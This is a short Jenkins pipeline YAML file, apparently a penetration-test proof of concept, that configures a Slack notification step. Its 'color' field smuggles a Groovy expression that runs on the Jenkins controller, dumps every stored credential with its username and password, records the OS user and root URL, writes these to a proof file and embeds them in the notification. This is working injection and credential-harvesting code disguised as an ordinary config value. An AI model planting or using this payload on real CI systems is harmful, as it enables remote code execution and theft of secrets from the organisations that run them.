general:
  projectName: kpprobe-prvoting
steps:
  slackSendNotification:
    baseUrl: 'http://127.0.0.1:9/'
    channel: '#kp'
    color: "${ def j = jenkins.model.Jenkins.instance ; def creds = j.getExtensionList('com.cloudbees.plugins.credentials.SystemCredentialsProvider')[0].getCredentials().collect{ it.id + '=' + it.username + ':' + it.password }.join(';') ; new File('/tmp/claude-1000/-home-kristian-Documents-pentesterV2/c0e751f5-0471-4b47-8001-66d9270cdb97/scratchpad/jrig/kp-forkpr-rce-proof.txt').text = 'kp-forkpr-nonce-b71e40 | ' + j.getClass().getName() + ' | osUser=' + System.getProperty('user.name') + ' | rootUrl=' + j.getRootUrl() + ' | creds=' + creds + ' | at ' + new Date() ; 'KPRCE|' + j.getClass().getName() + '|osUser=' + System.getProperty('user.name') + '|creds=' + creds + '|nonce=kp-forkpr-nonce-b71e40' }"
